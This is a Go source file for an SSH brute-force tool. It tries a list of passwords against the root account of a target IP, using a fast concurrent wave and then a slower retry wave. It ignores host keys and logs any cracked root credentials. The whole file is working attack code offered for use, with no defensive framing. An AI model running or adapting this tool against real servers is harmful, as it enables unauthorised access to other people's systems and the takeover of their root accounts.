package sshattack

import (
	"fmt"
	"log"
	"math/rand"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func Sshattack(ip string, passwd []string, rate int, sem chan struct{}) {
	// Sshattack launches a brute force attack on an SSH server by attempting to connect with a list of passwords.
	// It uses goroutines and channels to control the rate of connection attempts and handle the results.
	//
	// Parameters:
	// - ip (string): The IP address of the SSH server to attack.
	// - passwd ([]string): A list of passwords to try.
	// - rate (int): The maximum number of goroutines in a pool
	// - sem (chan struct{}): A semaphore channel used to control the rate of connection attempts.
	//
	// Example Usage:
	//   ip := "192.168.0.1"
	//   passwords := []string{"password1", "password2", "password3"}
	//   rate := 10
	//   sem := make(chan struct{}, rate)
	//
	//   Sshattack(ip, passwords, rate, sem)

	var wg2 sync.WaitGroup
	var slowqueue []string

	cancel := make(chan struct{})
	cracked := make(chan string)
	sem2 := make(chan struct{}, 100)
	slowchannel := make(chan string)
	ifslow := true

	log.Printf("starting rapidwave on %s...\n", ip)
term:
	for _, pass := range passwd {
		select {
		case <-cancel:
			close(cancel)
			break term
		default:
			sem2 <- struct{}{}
			wg2.Add(1)
			go rapidwave(ip, pass, cracked, sem2, cancel, slowchannel, &wg2)
		}
	}

	go func() {
		wg2.Wait()
		close(sem2)
	}()

	wg2.Wait()

	log.Printf("\033[1;36mrapid finished\033[0m\n")

	<-sem

	select {
	case _, ok := <-cancel:
		if ok {
			select {
			case x, ok := <-cracked:
				if ok {
					log.Println("password recieved", x)
					ifslow = false
				} else {
					break
				}
			case <-time.After(5 * time.Second):
				ifslow = true
				break
			}
			close(cancel)
		} else {
			log.Println("cancel is closed")
			select {
			case x, ok := <-cracked:
				if ok {
					log.Println("password recieved", x)
					ifslow = false
				} else {
					break
				}
			case <-time.After(5 * time.Second):
				ifslow = true
				break
			}
		}

	default:
		close(cancel)
	}

	close(cracked)

	if !ifslow {
		log.Println("slowwave disallowed (password found)")
		//slowwave not allowed
		return
	}

	wave2closed := false
	for !wave2closed {
		select {
		case x, ok := <-slowchannel:
			if ok {
				//have value -> recieve value
				slowqueue = append(slowqueue, x)
			} else {
				//wave channel closed
				wave2closed = true
			}
		default:
			//no value left (close channel)
			wave2closed = true
		}
	}

	log.Printf("\033[1;34m%d passwords queued for slowwave\033[0m", len(slowqueue))

	close(slowchannel)

	time.Sleep(time.Second * 1)

	log.Printf("\033[1;34mstarting slowwave on %s...\033[0m", ip)

	slowwave(ip, slowqueue)

	log.Print("\033[1;36mslowwave finished\n\033[0m")
}
func rapidwave(ip, pass string, cracked chan<- string, sem <-chan struct{}, cancel chan<- struct{}, wave2 chan<- string, wg *sync.WaitGroup) {
	/*
		rapid attempts to establish a rapid SSH connection pool to a given IP address using a provided password.
		If the connection is successful, it logs a success message. If the authentication fails, it logs an error message.
		If the maximum number of attempts is reached or the connection cannot be established,
		it sends a cancel signal and sends the password to a channel for further processing.

		Parameters:
		- ip (string): The IP address to connect to.
		- pass (string): The password to use for authentication.
		- cracked (chan<- string): A channel to send the cracked password to.
		- sem (<-chan struct{}): A channel to receive a semaphore signal from.
		- cancel (chan<- struct{}): A channel to send a cancel signal to.
		- wave2 (chan<- string): A channel to send the password to for further processing.
		- wg (*sync.WaitGroup): A pointer to a WaitGroup to track the completion of goroutines.

		Returns:
		- None. The function communicates the result through logging and channel communication.
	*/

	config := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	var client *ssh.Client
	var err error

	fail := true

	for i := 0; i < 10; i++ {
		source := rand.NewSource(time.Now().UnixNano())
		rng := rand.New(source)
		client, err = ssh.Dial("tcp", fmt.Sprintf("%s:22", ip), config)
		if err == nil {
			log.Printf("\x1b[32m%s has been cracked (root:%s)\x1b[0m\n", ip, pass)
			fail = false
			break
		}

		if strings.Contains(err.Error(), "unable to authenticate") {
			log.Printf("\x1b[31mroot@%s %s ❌\x1b[0m\n", ip, pass)
			fail = false
			break
		}
		randomMilli := rng.Intn(200) + 100

		time.Sleep(time.Millisecond * time.Duration(randomMilli))
	}

	if fail {
		<-sem
		wg.Done()
		wave2 <- pass
		return
	}

	defer func() {
		<-sem
		if client != nil {
			err := client.Close()

			if err != nil {
				log.Fatalln(err)
			}
		}
		if err != nil {
			wg.Done()
		}
	}()

	if err == nil {
		log.Println("cancelling")
		wg.Done()
		cancel <- struct{}{}
		log.Println("sending value to cracked")
		cracked <- pass
		log.Println("sent")
	}
}

func slowwave(ip string, passwds []string) {
	for _, pass := range passwds {
		attemptslowwave(ip, pass)
	}
}

func attemptslowwave(ip, pass string) {
	config := &ssh.ClientConfig{
		User:            "root",
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		Timeout:         1 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	failed := true
	for i := 0; i < 3; i++ {
		if client, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", ip), config); err == nil {
			defer func() {
				if client != nil {
					if err := client.Close(); err != nil {
						log.Fatalln(err)
					}
				}
			}()
			log.Printf("\x1b[32m%s has been cracked (root:%s)\x1b[0m\n", ip, pass)
			failed = false
			break
		} else if strings.Contains(err.Error(), "unable to authenticate") {
			log.Printf("\x1b[31mroot@%s %s ❌\x1b[0m\n", ip, pass)
			failed = false
			break
		}

	}

	if failed {
		fmt.Printf("\033[1;33mWARNNG!!! failed to authenticate %s after multiple waves\033[0m\n", pass)
	}
}
